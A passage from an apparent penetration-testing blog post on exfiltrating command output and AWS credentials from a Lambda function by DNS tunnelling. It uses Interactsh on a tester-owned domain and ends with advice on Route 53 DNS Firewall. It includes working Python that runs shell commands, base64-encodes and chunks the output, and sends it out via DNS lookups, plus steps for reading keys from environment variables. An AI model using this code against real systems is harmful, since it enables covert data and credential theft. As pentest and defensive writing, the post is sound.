&lt;p&gt;Privacy &amp;amp; Cost - Honestly, avoiding manually clicking through hundreds of queries was a good enough reason to not proceed further in Burp. However, at that juncture my concerns also included privacy. If I proceeded further on this attack path, I would potentially be exfiltrating intellectual property of the client via the oastify.com domain, which was shared by all users of Burp Collaborator, including other pentesting providers and potentially cybercriminals. Not that I don&amp;rsquo;t trust PortSwigger as a company, but I don&amp;rsquo;t want to mess up some of the queries on my end and potentially send the encoded data to unknown entities.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;A final reason, which may not apply to us, but for those reading this article who are just starting out in Cyber - BurpSuite Collaborator is a paywalled feature and the annual enterprise licensing cost may be prohibitive for many hobbyists or learners.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Moving the antenna to our own infrastructure&lt;span class=&#34;absolute -mt-20&#34; id=&#34;moving-the-antenna-to-our-own-infrastructure&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#moving-the-antenna-to-our-own-infrastructure&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;So, is there a private, low-cost / free DNS interaction tool which outputs the log to either the terminal or a file, and works with a domain owned by us? Initially I had fleeting thoughts of spinning up a Bind9 DNS server on a VPS and use a couple of hacked-together shell scripts to do it, but then I thought, man, there are plenty of smart folks in my team who know either this tool or that tool off like the back of their hand, which would serve my specific purpose.&lt;/p&gt;
&lt;p&gt;I asked our techies for help. Initially our developer volunteered to adapt his custom DNS server written in Go for this purpose, but before we could see this big-brain moment through, he had other more pressing matters than pursuing this side quest (a failed motherboard I heard). Then another consultant introduced me to &lt;a href=&#34;https://github.com/projectdiscovery/interactsh&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Interactsh&lt;/a&gt;, an open source tool maintained by ProjectDiscovery, designed to detect out-of-band (OOB) interactions. By default the oast.pro domain (I imagine owned by ProjectDiscovery) is used to catch queries, but one could buy a domain for a couple of bucks and tell the tool to point to it instead.&lt;/p&gt;
&lt;p&gt;Again DNS can be quite complicated if you&amp;rsquo;re not that familiar with the protocol - so I&amp;rsquo;ll briefly explain how the tool works here:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;[vuln app] ---makes DNS query A----&amp;gt; [server]
# then
[client] --ask for records of OOB-----&amp;gt; [server]
[client] &amp;lt;--sends DNS query A details-- [server]&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;In part 1 of this series I explained how DNS exfiltration works, so go to the relevant sections if you want a refresher on that. In the case of Interactsh, the &amp;ldquo;central server&amp;rdquo; maintained by ProjectDiscovery would resolve queries pointing towards subdomains of oast.pro. As a bug bounty hunter, you use the interactsh client to connect to the central interactsh server and be given a unique id. Any OOB interaction caught by the server, which matches your unique ID would be sent to your client and be displayed on your terminal. Screenshot below is from the README of the project, showing how the ID matching works.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic9.png&#34; title=&#34;pic9&#34; alt=&#34;pic9&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic9&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In comparison, shown below is how I set Interactsh up for the engagement. As described in part 1, I needed a domain where we can edit NS and A records. Let&amp;rsquo;s say we own &amp;ldquo;awesome-blogpost.com&amp;rdquo; and I decided to use subdomains of &amp;ldquo;subdomain.awesome-blogpost.com&amp;rdquo; as the query catcher. I spun up a public facing VPS with a static IP address a.b.c.d, pointed the the NS record for the subdomain to it, much like the below (read part 1 if this doesn&amp;rsquo;t make much sense):&lt;/p&gt;
&lt;p&gt;Set an NS record for &lt;code&gt;ns1.awesome-blogpost.com&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic10.png&#34; title=&#34;pic10&#34; alt=&#34;pic10&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic10&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;So we first start our server on the publicly-facing VPS with domain specified and the server CLI would provide you have a client token, which is like a unique password for the client to connect to (says text in the screenshot because &amp;ldquo;text&amp;rdquo; was the actual subdomain I used in the engagement).&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic11.png&#34; title=&#34;pic11&#34; alt=&#34;pic11&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic11&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic12.png&#34; title=&#34;pic12&#34; alt=&#34;pic12&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic12&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Then on my local machine, I connect to my server with with the client token and the &lt;code&gt;-dns-only&lt;/code&gt; flag, and you can see a unique URL being provided as a OOB payload. If anything makes a DNS query to &amp;ldquo;cnson… .text.awesome-blogpost.com&amp;rdquo;, my server would catch it and show it to the client.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic13.png&#34; title=&#34;pic13&#34; alt=&#34;pic13&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic13&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;Encoding adventures - weird Python error &amp;amp; RTFM&lt;span class=&#34;absolute -mt-20&#34; id=&#34;encoding-adventures---weird-python-error--rtfm&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#encoding-adventures---weird-python-error--rtfm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Before heading off to data encoding and the matter of writing a bootleg encoding protocol, let&amp;rsquo;s first address one thing - DNS is not meant for transmitting arbitrary length messages. I found out the hard way when trying to pipe &lt;code&gt;/etc/passwd&lt;/code&gt; (pentester&amp;rsquo;s favorite!) through the wire - that Python complained of this (on my local testing script):&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;Traceback (most recent call last):
  File &amp;#34;/usr/lib/python3.10/encodings/idna.py&amp;#34;, line 163, in encode
    raise UnicodeError(&amp;#34;label empty or too long&amp;#34;)
UnicodeError: label empty or too long&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;To replicate this at home, you can try to run this:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;python3 -c &amp;#39;import socket; longname = &amp;#34;A&amp;#34; * 1000; req = socket.gethostbyname(f&amp;#34;{longname}.example.com&amp;#34;)&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;What happened in that one command was Python being asked to do a DNS request for &amp;ldquo;AAAAA…(1000 of A&amp;rsquo;s)…AAA.example.com&amp;rdquo;. Searching for that error on Google landed me on a &lt;a href=&#34;https://stackoverflow.com/questions/51901399/python-requests-encoding-with-idna-codec-failed-unicodeerror-label-empty-o&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;StackOverflow question&lt;/a&gt; where a dev encountered the same error. A knowledgeable user answered the question explaining that it was actually not a &amp;ldquo;Unicode error&amp;rdquo; but rather a DNS protocol error, implicating the cause being the subdomain within a DNS query being way too long, quote:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It seems this is an issue from the &lt;code&gt;socket&lt;/code&gt; module. It fails when the URL&amp;rsquo;s hostname exceeds 64 characters.&lt;/p&gt;
&lt;p&gt;This is still an open issue &lt;a href=&#34;https://bugs.python.org/issue32958&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://bugs.python.org/issue32958&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Digging deeper into the bug report linked, another user wrote, quote:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The error can be consistently reproduced when the first substring of the url hostname is greater than 64 characters long, as in &amp;ldquo;0123…..90123.example.com&amp;rdquo;. This wouldn&amp;rsquo;t be a problem, … so the entire &amp;ldquo;[user]:[secret]@XXX&amp;rdquo; section must be less than 65 characters long.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;During the pentest I took the explaination as is because 64-byte limit sounded right, though I actually limited my encoding to 60-byte in total for some imagined &amp;ldquo;leeway&amp;rdquo;. When writing this blog post, I read the &lt;a href=&#34;https://www.rfc-editor.org/rfc/rfc1035&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;RFC1035 for DNS&lt;/a&gt; to confirm this (and say I have RTFM&amp;rsquo;d) and discovered, on page 7, that:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The labels … must start with a letter, end with a letter or digit, and have as interior characters only letters, digits, and hyphen … Labels must be 63 characters or less.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Turns out that those users were slightly wrong in that the maximum subdomain / hostname / label defined by the RFC was actually 63-bytes, not 64. You can verify this with tweaking the &lt;code&gt;longname&lt;/code&gt; variable to 64 and 63 in the Python oneliner above. Knowing that the final messages will be maximally 63-byte chunks definitely helps.&lt;/p&gt;
&lt;p&gt;Next we need to think about other limitations of the DNS protocol. In the RFC we just referenced, it is also stated that a label must consist only of (case-insensitive) letters, digits and hyphen. With the input space (command output i.e. STDOUT) consisting of all printable Ascii, including symbols like &lt;code&gt;%^@*#|/&lt;/code&gt;, &lt;code&gt;space&lt;/code&gt; and &lt;code&gt;newline&lt;/code&gt;, and the output space only consisting of letters, numbers and the unassuming hyphen &lt;code&gt;-&lt;/code&gt;, it is clear that some sort of encoding scheme is needed.&lt;/p&gt;
&lt;p&gt;The solution I came up with was the unassuming Base64 encode. Ideally you would want to encrypt the data with something like AES256 CBC as is the case for &amp;ldquo;production&amp;rdquo; C2 frameworks like Cobalt Strike, but we are dealing with a UAT build so let&amp;rsquo;s just roll with what we have.&lt;/p&gt;
&lt;p&gt;Before dealing with the message length, lets see how I implemented the encoding with the code snippet below - first we read the command output for popen() and encode into UTF-8 (because b64encode takes a byte sequence), then the payload was Base64 encoded, gets back a string with decode(&amp;lsquo;UTF-8&amp;rsquo;), and remove all the trailing &lt;code&gt;=&lt;/code&gt; which might appear in b64 encoding.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;data = popen(&amp;#39;uname -r&amp;#39;).read().encode(&amp;#39;UTF-8&amp;#39;) 
payload = b64encode(data).decode(&amp;#39;utf-8&amp;#39;).replace(&amp;#39;=&amp;#39;,&amp;#39;&amp;#39;)
url = f&amp;#39;http://{payload}..subdomain.awesome-blogpost.com&amp;#39;
lookup = gethostbyname(url)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;On Interactsh, we should get back the encoded output:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;[NS4xMC4yMTYtMjI1Ljg1NS5hbXpuMi54ODZfNjQK.&amp;lt;uuid&amp;gt;.subdomain.awesome-blogpost.com.] received DNS interaction from 35....&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Using the &lt;code&gt;base64&lt;/code&gt; cli utility, we would then get back the command output for &lt;code&gt;uname -r&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;$ echo -n &amp;#39;NS4xMC4yMTYtMjI1Ljg1NS5hbXpuMi54ODZfNjQK&amp;#39; | base64 -d
5.10.216-225.855.amzn2.x86_64&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic7.png&#34; title=&#34;pic7&#34; alt=&#34;pic7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h4&gt;Chunks &amp;amp; Ordering&lt;span class=&#34;absolute -mt-20&#34; id=&#34;chunks--ordering&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#chunks--ordering&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;When I first learnt about how TCP worked, it fascinated me with the inner mechanisms of stateful sessions, message ordering, length and integrity checks, and so on. Basically the protocol involves chopping the sender&amp;rsquo;s message into little chunks, and the receiver can receive them in any order, recombine the chunks, and get back the original message, with a check that a) the message is intact and, b) the message has ended. How brilliant!&lt;/p&gt;
&lt;p&gt;Now that I am about to chop my bootleg DNS messages into 60-odd byte chunks, the minimum that I need to implement is a system which gives a little index tag to the message, and when I get back the messages in any order, my decoder will be able to rearrange them, combine back the original message, and decode them as one.&lt;/p&gt;
&lt;p&gt;Below is how I implemented it (with a little bit of help from our friend ChatGPT…) - if the payload is less than 60 bytes long, we define that the number of segments is 0. Otherwise, it will just be the result of the length of the payload divided by 60 (e.g. for 80 byte payload, the number of segments is 2). We loop through the segments, cutting out &lt;code&gt;60*(n) to 60*(n+1) th&lt;/code&gt; bytes, and finally add the index label before the payload in the final DNS query:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;    data = popen(&amp;#39;ls /usr/bin&amp;#39;).read().encode(&amp;#39;UTF-8&amp;#39;) 
    payload = b64encode(data).decode(&amp;#39;utf-8&amp;#39;).replace(&amp;#39;=&amp;#39;,&amp;#39;&amp;#39;)

    if len(payload) % 60 == 0:
        num_segments = 0
    else:
        num_segments = (len(payload) // 60) &amp;#43; 1 

    for i in range(num_segments):
        start_index = i * 60
        end_index = start_index &amp;#43; 60
        segment = payload[start_index:end_index]
        url = f&amp;#39;{i}.{segment}..subdomain.awesome-blogpost.com&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;And the glorious moment of seeing the results back:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;    _       __                       __       __  
   (_)___  / /____  _________ ______/ /______/ /_ 
  / / __ \/ __/ _ \/ ___/ __ &amp;#39;/ ___/ __/ ___/ __ \
 / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /
/_/_/ /_/\__/\___/_/   \__,_/\___/\__/____/_/ /_/

        projectdiscovery.io
[INF] Listing 1 payload for OOB Testing
[INF] .subdomain.awesome-blogpost.com

[0.WwphbGlhcwphcmNoCmF3awpiMnN1bQpiYXNlMzIKYmFzZTY0CmJhc2VuYW1l.] Received DNS interaction (A) from 3.9.x.x at ...
[1.CmJhc2VuYwpiYXNoCmJhc2hidWcKYmFzaGJ1Zy02NApiZwpjYS1sZWdhY3kK.] Received DNS interaction (A) from 3.9.x.x at ...
[2.Y2F0CmNhdGNoc2VndgpjZApjaGNvbgpjaGdycApjaG1vZApjaG93bgpja3N1.] Received DNS interaction (A) from 35.177.x.x at ...
[3.bQpjb21tCmNvbW1hbmQKY29yZXV0aWxzCmNwCmNzcGxpdApjdXJsCmN1dApk.] Received DNS interaction (A) from 18.134.x.x at ...
[4.YXRlCmRkCmRmCmRpcgpkaXJjb2xvcnMKZGlybmFtZQpkbmYKZHUKZWNobwpl.] Received DNS interaction (A) from 35.177.x.x at ...
[5.Z3JlcAplbnYKZXhwYW5kCmV4cHIKZmFjdG9yCmZhbHNlCmZjCmZnCmZncmVw.] Received DNS interaction (A) from 35.177.x.x at ...
...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Mouse over and copy the output, run it through a oneliner to remove the extra stuff, sort it, remove the duplicates, and decode the whole thing:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;$ xclip -o clip | cut -d &amp;#39; &amp;#39; -f 1 | sed &amp;#39;s/\[//;s/\.\]//&amp;#39; | sort -h | uniq &amp;gt; output26; python3 decode2.py output26
Decoded string: 

alias
arch
awk
...
ls
md5sum
microdnf
mkdir
...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h3&gt;Look at me, I am the Lambda now&lt;span class=&#34;absolute -mt-20&#34; id=&#34;look-at-me-i-am-the-lambda-now&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#look-at-me-i-am-the-lambda-now&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Now we are cooking! That&amp;rsquo;s basically a semi-interactive shell (with a couple of extra steps). Each command we want to run we put it in the popen(), invoke the app&amp;rsquo;s feature, get back results from Interactsh, and decode in Python. I&amp;rsquo;ll skip the enumeration bit and jump straight to the post-exploitation. Knowing that we are inside of an AWS Lambda, there are quite a few angles to tackle and exploit this. For more information specific to Lambda exploitation, refer to &lt;a href=&#34;https://hackingthe.cloud/aws/post_exploitation/lambda_persistence/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Hacktricks&amp;rsquo; articles on this&lt;/a&gt;. Sadly the pentest timeline was approaching its end and I felt the need to go for the highest impact finding as soon as possible, instead of exploring with a leisurely pace. Having a way to get data out and run commands, we could read environmental variables to extract the AWS secret &amp;amp; access keys of the application. With AWS credentials you can impersonate the application&amp;rsquo;s identity and access (supposedly) whatever the app could access inside of the AWS tenant.&lt;/p&gt;
&lt;p&gt;This was the first method I demonstrated, showing how the &amp;ldquo;AWS_ACCESS_KEY_ID&amp;rdquo; was extracted with os.envrion.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic14.png&#34; title=&#34;pic14&#34; alt=&#34;pic14&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic14&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The second method, reading the environmental vars from &lt;code&gt;/proc/self/environ&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic15.png&#34; title=&#34;pic15&#34; alt=&#34;pic15&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic15&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;To authenticate to AWS with these credentials on the cli, you first put the keys extracted into a profile in your &lt;code&gt;~/.aws/credentials&lt;/code&gt; file like this:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic16.png&#34; title=&#34;pic16&#34; alt=&#34;pic16&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic16&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Running &lt;code&gt;sts get-caller-identity&lt;/code&gt;, the &lt;code&gt;whoami&lt;/code&gt; for aws cli, we can see that the authentication as the lambda was successful.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic17.png&#34; title=&#34;pic17&#34; alt=&#34;pic17&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic17&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Then comes the somewhat anticlimatic end to the engagement. With bruteforcing cloud resources that the Lambda&amp;rsquo;s identity could access, I found that everything returned empty except the IP ranges used, which honestly wasn&amp;rsquo;t much. There were some other attack vectors pertaining the Lambda angle, such as the &lt;code&gt;/invocation/next&lt;/code&gt; endpoint and so on, but avenues to further lateral movement and escalation within the AWS tenant appeared to be limited.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic18.png&#34; title=&#34;pic18&#34; alt=&#34;pic18&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic18&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;Epilogue - Investigations on AWS&lt;span class=&#34;absolute -mt-20&#34; id=&#34;epilogue---investigations-on-aws&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#epilogue---investigations-on-aws&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Throughout the testing of this application I was in constant back-and-forth communications with the client to keep them up to date with my findings, and potential ways to remediate the vulnerabilities discovered. All in all, they were quite glad that we have discovered issues of this magnitude, and were shocked that the application could talk to the outside world via DNS when they supposedly &amp;ldquo;blocked everything&amp;rdquo;. In the report I suggested to look into built-in cloud DNS capabilities and blocking ports alone might not be enough to stop an &amp;ldquo;air gapped&amp;rdquo; cloud app from DNS tunnelling, especially the server-less kinds. (Think Lambda for AWS, or PowerApp for Azure).&lt;/p&gt;
&lt;p&gt;After delivering the report I couldn&amp;rsquo;t stop thinking about this remediation bit because:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;I thought it should be possible to configure that capacity, but I&amp;rsquo;m not 100% sure how to. So if I deployed a Lambda myself, I wasn&amp;rsquo;t sure yet how it should be secured against this attack (besides not having an RCE, phew!).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Or … what if there wasn&amp;rsquo;t an AWS native thing you could just enable and call it a day? Could I have just found a CVE on AWS Lambda itself?&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So the lingering thought drove me to spin up my own Lambda which executed plain old Python 3.11. I set up the Network Security Group to block 0.0.0.0/0 on all the TCP and UDP ports, and gave it a go. Voila, the same issue, DNS tunnelling through and querying my Burp Collaborator. Okay, first step done. How to close it off?&lt;/p&gt;
&lt;p&gt;I searched around for a bit for strings like &amp;ldquo;DNS Firewall&amp;rdquo; within AWS and on Google. Soon I found this: &amp;ldquo;Route 53 Resolver DNS Firewall&amp;rdquo;, a billable service … that blocks port 53 after you have blocked port 53. I was like &amp;ldquo;of course Jeff, I knew you&amp;rsquo;d do this to us…&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic19.png&#34; title=&#34;pic17&#34; alt=&#34;pic17&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic17&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;To keep the setup description short, what you need to do is to create a rule group first. In configurations, as I needed a blanket block I defined a rule to block absolutely everything, then click add rule. If you need some DNS resolution for your internal domains, you could define a custom allowlist.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
